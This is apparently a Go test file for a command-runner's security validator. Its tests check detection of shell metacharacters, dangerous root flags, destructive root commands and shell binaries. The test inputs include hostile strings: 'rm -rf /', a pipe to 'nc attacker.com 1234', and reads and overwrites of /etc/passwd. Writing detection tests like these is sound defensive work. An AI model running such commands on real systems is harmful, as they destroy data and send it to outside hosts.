package security

import (
	"testing"

	"github.com/isseis/go-safe-cmd-runner/internal/runner/security"

	"github.com/stretchr/testify/require"
)

// TestCommandArgumentEscape_ShellMetacharacters tests detection of shell
// metacharacters in command arguments
func TestCommandArgumentEscape_ShellMetacharacters(t *testing.T) {
	validator, err := security.NewValidator(nil)
	require.NoError(t, err)

	tests := []struct {
		name        string
		args        []string
		expectShell bool
		reason      string
	}{
		{
			name:        "Semicolon command separator",
			args:        []string{"arg1", "arg2; rm -rf /"},
			expectShell: true,
			reason:      "Semicolon can chain commands",
		},
		{
			name:        "Pipe operator",
			args:        []string{"file.txt", "| nc attacker.com 1234"},
			expectShell: true,
			reason:      "Pipe can redirect output",
		},
		{
			name:        "Ampersand background operator",
			args:        []string{"command &"},
			expectShell: true,
			reason:      "Ampersand runs command in background",
		},
		{
			name:        "AND operator",
			args:        []string{"cmd1 && cmd2"},
			expectShell: true,
			reason:      "AND operator chains commands",
		},
		{
			name:        "OR operator",
			args:        []string{"cmd1 || cmd2"},
			expectShell: true,
			reason:      "OR operator chains commands",
		},
		{
			name:        "Command substitution with dollar",
			args:        []string{"$(malicious)"},
			expectShell: true,
			reason:      "Command substitution executes commands",
		},
		{
			name:        "Command substitution with backticks",
			args:        []string{"`malicious`"},
			expectShell: true,
			reason:      "Backticks execute commands",
		},
		{
			name:        "Output redirect",
			args:        []string{"data", "> /etc/passwd"},
			expectShell: true,
			reason:      "Redirect can overwrite files",
		},
		{
			name:        "Input redirect",
			args:        []string{"< /etc/passwd"},
			expectShell: true,
			reason:      "Redirect can read sensitive files",
		},
		{
			name:        "Wildcard asterisk",
			args:        []string{"*.txt"},
			expectShell: true,
			reason:      "Asterisk wildcard can expand unexpectedly",
		},
		{
			name:        "Safe arguments",
			args:        []string{"-v", "--flag", "value", "/path/to/file"},
			expectShell: false,
			reason:      "Standard arguments without metacharacters",
		},
		{
			name:        "Safe path with spaces",
			args:        []string{"/path/with spaces/file.txt"},
			expectShell: false,
			reason:      "Spaces alone are not dangerous",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			hasShellMeta := validator.HasShellMetacharacters(tt.args)
			require.Equal(t, tt.expectShell, hasShellMeta,
				"Shell metacharacters detection mismatch: %s (args: %v)", tt.reason, tt.args)
		})
	}
}

// TestCommandArgumentEscape_DangerousRootArgs tests detection of dangerous
// argument patterns when running as root
func TestCommandArgumentEscape_DangerousRootArgs(t *testing.T) {
	validator, err := security.NewValidator(nil)
	require.NoError(t, err)

	tests := []struct {
		name          string
		args          []string
		expectIndices []int
		reason        string
	}{
		{
			name:          "Recursive delete flag",
			args:          []string{"-rf", "/tmp/test"},
			expectIndices: []int{0},
			reason:        "-rf contains 'rf' dangerous pattern",
		},
		{
			name:          "Force flag",
			args:          []string{"--force", "file.txt"},
			expectIndices: []int{0},
			reason:        "--force contains 'force' pattern",
		},
		{
			name:          "All flag",
			args:          []string{"--all", "/"},
			expectIndices: []int{0},
			reason:        "--all contains 'all' pattern",
		},
		{
			name:          "Recursive all flag",
			args:          []string{"-r", "--all", "/system"},
			expectIndices: []int{1},
			reason:        "--all pattern is dangerous",
		},
		{
			name:          "Multiple dangerous flags",
			args:          []string{"-rf", "--force", "target"},
			expectIndices: []int{0, 1},
			reason:        "Multiple dangerous patterns detected",
		},
		{
			name:          "Safe arguments",
			args:          []string{"-v", "--verbose", "file.txt"},
			expectIndices: nil,
			reason:        "Standard safe flags",
		},
		{
			name:          "Safe paths",
			args:          []string{"/home/user/file", "/tmp/output.log"},
			expectIndices: nil,
			reason:        "Normal file paths without dangerous patterns",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			dangerousIndices := validator.HasDangerousRootArgs(tt.args)
			require.Equal(t, tt.expectIndices, dangerousIndices,
				"Dangerous argument indices mismatch: %s (args: %v)", tt.reason, tt.args)
		})
	}
}

// TestCommandArgumentEscape_CommandValidation tests command whitelist validation
func TestCommandArgumentEscape_CommandValidation(t *testing.T) {
	validator, err := security.NewValidator(nil)
	require.NoError(t, err)

	tests := []struct {
		name    string
		command string
		wantErr bool
		reason  string
	}{
		{
			name:    "Empty command",
			command: "",
			wantErr: true,
			reason:  "Empty command should be rejected",
		},
		{
			name:    "Standard ls command",
			command: "/bin/ls",
			wantErr: false,
			reason:  "ls is typically allowed",
		},
		{
			name:    "Standard cat command",
			command: "/bin/cat",
			wantErr: false,
			reason:  "cat is typically allowed",
		},
		{
			name:    "Standard echo command",
			command: "/bin/echo",
			wantErr: false,
			reason:  "echo is typically allowed",
		},
		{
			name:    "Standard grep command",
			command: "/bin/grep",
			wantErr: false,
			reason:  "grep is typically allowed",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validator.ValidateCommand(tt.command)

			if tt.wantErr {
				require.Error(t, err, "Command %q should be rejected: %s", tt.command, tt.reason)
			} else if err != nil {
				// Note: May fail based on actual whitelist configuration
				// Not using require.NoError here since whitelist may vary
				t.Skipf("Command %q rejected (may be intentional based on whitelist): %v",
					tt.command, err)
			}
		})
	}
}

// TestCommandArgumentEscape_DangerousRootCommands tests detection of dangerous
// commands when running as root
func TestCommandArgumentEscape_DangerousRootCommands(t *testing.T) {
	validator, err := security.NewValidator(nil)
	require.NoError(t, err)

	tests := []struct {
		name       string
		cmdPath    string
		expectDang bool
		reason     string
	}{
		{
			name:       "rm command",
			cmdPath:    "/bin/rm",
			expectDang: true,
			reason:     "rm can delete system files",
		},
		{
			name:       "rmdir command",
			cmdPath:    "/bin/rmdir",
			expectDang: true,
			reason:     "rmdir can remove system directories",
		},
		{
			name:       "dd command",
			cmdPath:    "/bin/dd",
			expectDang: true,
			reason:     "dd can overwrite disk devices",
		},
		{
			name:       "mkfs command",
			cmdPath:    "/sbin/mkfs",
			expectDang: true,
			reason:     "mkfs formats filesystems",
		},
		{
			name:       "fdisk command",
			cmdPath:    "/sbin/fdisk",
			expectDang: true,
			reason:     "fdisk modifies partition tables",
		},
		{
			name:       "chmod command",
			cmdPath:    "/bin/chmod",
			expectDang: true,
			reason:     "chmod can change critical permissions",
		},
		{
			name:       "chown command",
			cmdPath:    "/bin/chown",
			expectDang: true,
			reason:     "chown can change file ownership",
		},
		{
			name:       "Safe ls command",
			cmdPath:    "/bin/ls",
			expectDang: false,
			reason:     "ls is read-only and safe",
		},
		{
			name:       "Safe cat command",
			cmdPath:    "/bin/cat",
			expectDang: false,
			reason:     "cat is read-only and safe",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			isDangerous := validator.IsDangerousRootCommand(tt.cmdPath)
			require.Equal(t, tt.expectDang, isDangerous,
				"Dangerous root command status mismatch for %q: %s", tt.cmdPath, tt.reason)
		})
	}
}

// TestCommandArgumentEscape_ShellCommands tests detection of shell commands
func TestCommandArgumentEscape_ShellCommands(t *testing.T) {
	validator, err := security.NewValidator(nil)
	require.NoError(t, err)

	tests := []struct {
		name     string
		cmdPath  string
		expectSh bool
		reason   string
	}{
		{
			name:     "bash shell",
			cmdPath:  "/bin/bash",
			expectSh: true,
			reason:   "bash is a shell",
		},
		{
			name:     "sh shell",
			cmdPath:  "/bin/sh",
			expectSh: true,
			reason:   "sh is a shell",
		},
		{
			name:     "zsh shell",
			cmdPath:  "/bin/zsh",
			expectSh: true,
			reason:   "zsh is a shell",
		},
		{
			name:     "Non-shell command",
			cmdPath:  "/bin/ls",
			expectSh: false,
			reason:   "ls is not a shell",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			isShell := validator.IsShellCommand(tt.cmdPath)
			require.Equal(t, tt.expectSh, isShell,
				"Shell command status mismatch for %q: %s", tt.cmdPath, tt.reason)
		})
	}
}
